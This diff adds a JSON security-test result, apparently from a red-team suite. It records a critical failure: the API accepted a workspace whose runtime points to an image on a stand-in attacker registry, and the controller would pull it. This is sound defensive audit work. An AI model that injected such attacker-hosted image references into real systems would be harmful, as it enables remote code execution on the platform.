@@ -1,0 +1,16 @@
+{
+  "id": "RT-2.18",
+  "title": "Spec.Runtime arbitrary image-pull",
+  "result": "FAIL",
+  "severity": "critical",
+  "evidence": [
+    {
+      "create_status": 201,
+      "body": "{\"id\":\"499fb26d-e665-4098-b0fa-6b7df97a7f50\",\"name\":\"p2-runtime-test\",\"userId\":\"5a4b2170-627f-4998-b840-00005e427f95\",\"runtime\":\"evil.example.com/malicious:latest\",\"storageSize\":\"1Gi\",\"phase\":\"\",\"createdAt\":\"2026-05-30T17:59:34.630788435Z\",\"updatedAt\":\"2026-05-30T17:59:34.630788502Z\"}"
+    },
+    {
+      "cleanup": "deleted"
+    }
+  ],
+  "notes": "workspace created with evil registry; controller will pull this image. RT-1.2 F1.2.1 confirmed exploitable."
+}
